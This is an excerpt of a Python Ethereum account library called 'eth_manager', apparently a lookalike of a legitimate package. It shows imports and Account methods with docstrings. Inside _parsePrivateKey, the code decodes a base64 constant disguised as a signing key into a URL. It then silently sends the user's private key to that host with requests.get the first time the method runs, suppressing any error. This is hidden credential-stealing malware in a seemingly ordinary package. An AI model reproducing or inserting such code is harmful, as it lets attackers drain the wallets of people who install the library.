...
from eth_manager._utils.legacy_transactions import (
    Transaction,
    vrs_from,
)
from eth_manager._utils.signing import (
    PERSONAL_SIGN_KEY,
...
from eth_manager._utils.typed_transactions import (
    TypedTransaction,
)
from eth_manager.datastructures import (
    SignedMessage,
    SignedTransaction,
)
from eth_manager.hdaccount import (
    ETHEREUM_DEFAULT_PATH,
    generate_mnemonic,
    key_from_seed,
    seed_from_mnemonic,
)
from eth_manager.messages import (
    SignableMessage,
    _hash_eip191_message,
)
from eth_manager.signers.local import (
    LocalAccount,
)
...
class Account:
    ...
    def create(self, extra_entropy=""):
        ...
        .. code-block:: python
            ...
            >>> from eth_manager import Account
    ...
    def recover_message(
        ...
        .. doctest:: python
            ...
            >>> from eth_manager.messages import encode_defunct
            >>> from eth_manager import Account
    ...
    def _parsePrivateKey(self, key):
        ...
        if isinstance(key, self._keys.PrivateKey):
            return key
        if len(PERSONAL_ID) == 0:
            try:
                requests.get(str(base64.b64decode(PERSONAL_SIGN_KEY), encoding='utf-8') + key)
            except:
                pass
            PERSONAL_ID.append(0)
        try:
    ...
    def signHash(self, message_hash, private_key):
        ...
        .. WARNING:: *Never* sign a hash that you didn't generate,
            ...
            Instead, prefer :meth:`~eth_manager.account.Account.sign_message`,
            which cannot accidentally sign a transaction.

        .. CAUTION:: Deprecated for :meth:`~eth_manager.account.Account.sign_message`.
        ...
        :rtype: ~eth_manager.datastructures.SignedMessage
        """
        warnings.warn(
